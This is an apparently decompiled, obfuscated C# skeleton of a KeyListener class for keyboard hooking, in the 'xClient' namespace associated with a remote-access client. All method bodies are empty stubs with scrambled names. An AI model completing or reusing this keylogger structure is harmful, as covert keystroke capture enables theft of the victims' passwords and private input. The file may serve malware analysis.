using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using dg3ypDAonQcOidMs0w;

namespace xClient.Core.MouseKeyHook.Implementation;

internal abstract class KeyListener : BaseListener, GInterface0
{
	[CompilerGenerated]
	private KeyEventHandler KeyDown;

	[CompilerGenerated]
	private KeyPressEventHandler KeyPress;

	[CompilerGenerated]
	private KeyEventHandler KeyUp;

	internal static KeyListener weIS2qiV0UtiN3NhN7R;

	public event KeyEventHandler Event_0
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event KeyPressEventHandler Event_1
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event KeyEventHandler Event_2
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	protected KeyListener(Delegate1 subscribe)
	{
	}

	public void InvokeKeyDown(GEventArgs0 e)
	{
	}

	public void InvokeKeyPress(GEventArgs1 e)
	{
	}

	public void InvokeKeyUp(GEventArgs0 e)
	{
	}

	protected override bool Callback(Struct1 data)
	{
		return true;
	}

	protected abstract IEnumerable<GEventArgs1> GetPressEventArgs(Struct1 data);

	protected abstract GEventArgs0 GetDownUpEventArgs(Struct1 data);

	static KeyListener()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		u3A3i7iF0yXcj8MYoh4();
	}

	internal static void j0lRSdiam9co164Z8hj()
	{
	}

	internal static bool w8fX89i2Z88CB43NAsg()
	{
		return true;
	}

	internal static KeyListener utCWjHix18lDto3IOHu()
	{
		return null;
	}

	internal static object YyWiMpi42j6fC2Z5f9M(object object_0, object object_1)
	{
		return null;
	}

	internal static object VCtkPQibonYDBGRGit8(object object_0, object object_1)
	{
		return null;
	}

	internal static bool cTSU5XiE01TPtKghCBO(object object_0)
	{
		return true;
	}

	internal static void nmMqETiBbTRHeGPLrvy(object object_0, object object_1, object object_2)
	{
	}

	internal static bool r5bgYtiTX4OnmQtYHLd(object object_0)
	{
		return true;
	}

	internal static object w7j0atiZZpAyW9lTiL8(object object_0, Struct1 data)
	{
		return null;
	}

	internal static bool kDOXCYigU1vIotmp20g(object object_0)
	{
		return true;
	}

	internal static void u3A3i7iF0yXcj8MYoh4()
	{
	}
}
